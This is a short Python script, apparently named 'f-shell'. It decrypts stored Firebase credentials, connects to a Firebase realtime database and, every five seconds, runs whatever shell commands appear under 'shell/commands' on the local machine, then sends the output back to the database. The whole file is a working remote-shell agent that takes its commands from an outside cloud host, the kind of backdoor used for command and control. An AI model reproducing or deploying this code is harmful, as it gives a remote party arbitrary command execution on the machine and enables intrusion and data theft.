import firebase_admin
from firebase_admin import credentials, db
import subprocess
import time
from cryptography.fernet import Fernet

# Load the encryption key
with open('.secret.key', 'rb') as key_file:
    key = key_file.read()

cipher = Fernet(key)

# Function to decrypt a file
def decrypt_file(file_path):
    with open(file_path, 'rb') as f:
        encrypted_data = f.read()
    decrypted_data = cipher.decrypt(encrypted_data)
    with open(file_path, 'wb') as f:
        f.write(decrypted_data)

# Function to encrypt a file
def encrypt_file(file_path):
    with open(file_path, 'rb') as f:
        file_data = f.read()
    encrypted_data = cipher.encrypt(file_data)
    with open(file_path, 'wb') as f:
        f.write(encrypted_data)

# Decrypt the f-shell.json file before initializing Firebase
decrypt_file('.f-shell.json')

# Initialize the Firebase app with the service account credentials
cred = credentials.Certificate('.f-shell.json')
firebase_admin.initialize_app(cred, {
    'databaseURL': 'https://fshell-default-rtdb.firebaseio.com/'
})

# Re-encrypt the f-shell.json file after initializing Firebase
encrypt_file('.f-shell.json')

# Function to execute a command and return output
def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        return output
    except subprocess.CalledProcessError as e:
        return f"Error: {e.output}"

# Function to check for new commands and execute them
def check_for_commands():
    ref = db.reference('shell/commands')
    try:
        commands = ref.get()
        if commands:
            for key, value in commands.items():
                command = value.get('command', '')
                if command:
                    output = execute_command(command)
                    output_ref = db.reference('shell/output')
                    output_ref.push().set({'output': output})
                    ref.child(key).delete()
    except Exception as e:
        print(f"Error while fetching/processing commands: {e}")

# Continuously check for commands
while True:
    check_for_commands()
    time.sleep(5)  # Increased sleep time to allow commands to execute and capture output

